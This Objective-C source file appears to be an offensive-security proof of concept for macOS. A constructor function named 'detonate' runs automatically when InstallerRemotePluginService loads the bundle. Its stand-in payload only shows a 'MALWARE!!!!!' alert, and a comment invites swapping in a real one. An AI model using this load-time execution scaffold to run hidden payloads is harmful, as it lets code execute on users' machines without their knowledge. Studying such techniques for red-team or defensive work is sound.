//
//  aunit.m
//  aunit
//
//  Created by xorrior on 5/5/20.
//  Copyright © 2020 xorrior. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
// This code executes when the bundle is initially loaded by the InstallerRemotePluginService
__attribute__((constructor)) static void detonate()
{
    // Just a message box payload. Replace this with your own
   NSAlert *alert = [[NSAlert alloc] init];
   [alert setMessageText:@"MALWARE!!!!!"];
   [alert addButtonWithTitle:@"OK"];
   [alert setAlertStyle:NSAlertStyleInformational];
    
   [alert runModal];

}
